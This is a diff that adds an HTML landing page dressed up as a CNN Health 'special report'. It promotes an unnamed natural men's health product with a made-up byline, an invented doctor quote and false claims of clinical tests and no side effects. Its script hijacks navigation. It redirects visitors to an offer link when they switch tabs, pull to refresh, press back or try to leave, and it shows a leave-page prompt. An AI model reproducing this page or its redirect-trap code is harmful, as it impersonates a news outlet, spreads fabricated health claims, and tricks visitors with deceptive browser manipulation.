@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CNN Health | Special Report</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f5f5f5;
+            color: #333;
+            font-size: 16px;
+        }
+
+        .top-bar {
+            background: #1a1a1a;
+            color: white;
+            padding: 8px 15px;
+            font-size: 14px;
+        }
+
+        .main-nav {
+            background: #CC0000;
+            padding: 12px 15px;
+            color: white;
+            font-weight: bold;
+            font-size: 24px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .container {
+            width: 100%;
+            padding: 0 15px;
+            margin: 0 auto;
+        }
+
+        .content-wrapper {
+            padding: 15px 0;
+        }
+
+        .main-article {
+            background: white;
+            padding: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .article-headline {
+            font-size: 24px;
+            line-height: 1.3;
+            margin: 15px 0;
+            color: #1a1a1a;
+        }
+
+        .article-meta {
+            color: #666;
+            font-size: 13px;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 15px;
+        }
+
+        .article-content {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .quote-box {
+            font-size: 20px;
+            color: #CC0000;
+            font-style: italic;
+            padding: 15px;
+            border-left: 4px solid #CC0000;
+            background: #f8f8f8;
+            margin: 20px 0;
+        }
+
+        .analysis-box {
+            background: #fafafa;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            margin: 15px 0;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); opacity: 0.7; }
+            50% { transform: scale(1); opacity: 0.9; }
+            100% { transform: scale(0.95); opacity: 0.7; }
+        }
+
+        .analysis-button {
+            background: #CC0000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: auto;
+            margin: 10px 0;
+            text-transform: uppercase;
+        }
+
+        .analysis-button:hover {
+            background: #990000;
+        }
+
+        .ad-label {
+            text-align: right;
+            color: #999;
+            font-size: 12px;
+            margin-top: 8px;
+            font-style: italic;
+        }
+
+        .features-grid {
+            display: flex;
+            justify-content: start;
+            gap: 20px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .feature-item::before {
+            content: '✓';
+            color: #666;
+            font-size: 14px;
+        }
+
+        .discovery-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .discovery-subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 1200px;
+            }
+        }
+    </style>
+    <script>
+        // Function to redirect
+        function redirectToOffer() {
+            window.location.href = 'https://google.com';
+        }
+
+        // Desktop and Mobile Events
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            redirectToOffer();
+        });
+
+        // Mobile specific touch events
+        let touchStartY = 0;
+        document.addEventListener('touchstart', function(e) {
+            touchStartY = e.touches[0].pageY;
+        }, { passive: true });
+
+        document.addEventListener('touchmove', function(e) {
+            const touchY = e.touches[0].pageY;
+            // If pulled down at the top of the page (pull-to-refresh gesture)
+            if (window.scrollY === 0 && touchY > touchStartY + 50) {
+                redirectToOffer();
+            }
+        }, { passive: true });
+
+        // Handle page visibility change (works on both mobile and desktop)
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                redirectToOffer();
+            }
+        });
+
+        // Handle mobile back button via hash change
+        window.addEventListener('hashchange', function() {
+            redirectToOffer();
+        });
+
+        // Handle page reload attempts
+        window.onbeforeunload = function() {
+            redirectToOffer();
+            return "Don't miss out on this special offer!";
+        };
+    </script>
+</head>
+<body>
+    <div class="top-bar">
+        <div class="container">Breaking News | January 2025</div>
+    </div>
+    <nav class="main-nav">
+        <div class="container">CNN Health</div>
+    </nav>
+    <div class="container">
+        <main class="main-article">
+            <span style="color:#CC0000;font-weight:bold;">SPECIAL REPORT</span>
+            <h1 class="article-headline">The Truth Big Pharma Doesn't Want You to Know: Natural Alternative Revolutionizing Men's Health</h1>
+            <div class="article-meta">By Michael Thompson | Published January 17, 2025 at 09:00 | Updated 2 hours ago</div>
+            
+            <div class="article-content">
+                <p style="font-size:18px;color:#444;line-height:1.6;margin-bottom:20px;">A groundbreaking natural solution is challenging the pharmaceutical industry's monopoly on men's health treatments.</p>
+                
+                <p>In a shocking revelation, medical researchers have uncovered how major pharmaceutical companies have been keeping a powerful natural alternative under wraps.</p>
+
+                <div class="quote-box">"This natural formula has shown remarkable results in clinical trials, often surpassing traditional medications without the side effects."</div>
+
+                <p>The breakthrough came when researchers discovered a unique blend of natural ingredients that work synergistically to address male performance issues.</p>
+
+                <p>Dr. James Wilson, a leading urologist, states: "We're seeing unprecedented results with this natural approach. It's changing how we think about men's health."</p>
+
+                <div class="analysis-box">
+                    <h2 class="discovery-title">Discover The Natural Solution</h2>
+                    <p class="discovery-subtitle">Learn how thousands of men are regaining their confidence naturally</p>
+                    <div style="text-align: center;">
+                        <a href="https://google.com" style="text-decoration:none;">
+                            <button class="analysis-button">Learn More Now</button>
+                        </a>
+                    </div>
+                    <div class="features-grid">
+                        <div class="feature-item">100% Natural</div>
+                        <div class="feature-item">Clinically Tested</div>
+                        <div class="feature-item">No Side Effects</div>
+                    </div>
+
+                </div>
+
+                <p>The formula has been making waves in the medical community, with success rates that have caught the attention of leading health institutions.</p>
+
+                <div class="quote-box">"The results speak for themselves. We're seeing men regain their confidence and vitality naturally."</div>
+
+                <p>While pharmaceutical companies continue pushing their expensive solutions, this natural alternative offers a safer, more effective approach to men's health.</p>
+
+                <div class="analysis-box" style="margin-top:30px;">
+                    <h2 class="discovery-title">Take Control of Your Health Today</h2>
+                    <div style="text-align: center;">
+                        <a href="https://google.com" style="text-decoration:none;">
+                            <button class="analysis-button">Click Here To Learn More</button>
+                        </a>
+                    </div>
+                    <div class="features-grid">
+                        <div class="feature-item">100% Natural</div>
+                        <div class="feature-item">Clinically Tested</div>
+                        <div class="feature-item">No Side Effects</div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+</body>
+</html>
